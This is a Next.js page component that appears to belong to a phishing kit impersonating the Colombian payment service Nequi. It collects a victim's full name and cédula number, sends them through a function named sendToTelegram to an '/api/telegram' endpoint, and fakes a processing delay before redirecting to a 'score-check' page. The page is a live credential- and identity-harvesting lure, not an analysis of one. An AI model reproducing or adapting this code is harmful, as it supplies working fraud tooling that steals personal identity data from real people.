"use client"

import type React from "react"
import { useState } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"

export default function PersonalInfo() {
  const [name, setName] = useState("")
  const [document, setDocument] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const router = useRouter()

  const sendToTelegram = async (type: string, data: any) => {
    try {
      const response = await fetch("/api/telegram", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          type,
          ...data,
        }),
      })

      if (!response.ok) {
        const errorData = await response.json()
        console.error("Error sending to Telegram:", errorData)
      }
    } catch (error) {
      console.error("Error sending to Telegram:", error)
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (name.trim() && document.trim()) {
      setIsLoading(true)

      // Enviar información personal a Telegram
      await sendToTelegram("personal_info", {
        name: name.trim(),
        document: document.trim(),
      })

      // Simular procesamiento
      setTimeout(() => {
        setIsLoading(false)
        // Guardar datos en localStorage para usar en la siguiente página
        localStorage.setItem(
          "userInfo",
          JSON.stringify({
            name: name.trim(),
            document: document.trim(),
          }),
        )
        router.push("/score-check")
      }, 2000)
    }
  }

  const cleanAndLimitDigits = (value: string, maxLength: number) => {
    return value.replace(/\D/g, "").slice(0, maxLength)
  }

  const handleDocumentChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const cleaned = cleanAndLimitDigits(e.target.value, 10)
    setDocument(cleaned)
  }

  return (
    <div className="min-h-screen flex items-center justify-center p-4">
      {" "}
      {/* Eliminar el gradiente de fondo aquí */}
      {/* Loader */}
      {isLoading && (
        <div className="fixed inset-0 z-20 flex items-center justify-center bg-white">
          <div className="flex flex-col items-center">
            <img
              src="/loading-nequi.webp"
              alt="Cargando Nequi"
              className="w-40 h-40 object-contain mt-16 animate-pulse"
            />
            <p className="font-semibold mt-4 text-gray-700">Procesando información...</p>
          </div>
        </div>
      )}
      <div className="w-full max-w-md bg-white rounded-lg p-8 shadow-lg">
        {" "}
        {/* Fondo blanco para la tarjeta */}
        <div className="text-center mb-8">
          <h1 className="text-2xl font-semibold text-[#200020] mb-2">Información Personal</h1>
          <p className="text-gray-600">Ingresa tus datos para continuar</p>
        </div>
        <form onSubmit={handleSubmit} className="space-y-6">
          <div>
            <Label htmlFor="name" className="block text-sm font-medium text-gray-700 mb-2">
              Nombre completo
            </Label>
            <Input
              id="name"
              type="text"
              value={name}
              onChange={(e) => setName(e.target.value)}
              placeholder="Ingresa tu nombre completo"
              className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:border-[#DA0081] focus:outline-none transition-colors"
              required
            />
          </div>

          <div>
            <Label htmlFor="document" className="block text-sm font-medium text-gray-700 mb-2">
              Número de documento
            </Label>
            <Input
              id="document"
              type="text"
              value={document}
              onChange={handleDocumentChange}
              placeholder="Número de cédula"
              className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:border-[#DA0081] focus:outline-none transition-colors"
              required
            />
          </div>

          <Button
            type="submit"
            className="w-full py-3 bg-[#DA0081] text-white font-semibold rounded-lg hover:bg-[#b3006b] transition-colors disabled:opacity-50"
            disabled={!name.trim() || !document.trim() || isLoading}
          >
            {isLoading ? "Procesando..." : "Continuar"}
          </Button>
        </form>
      </div>
    </div>
  )
}
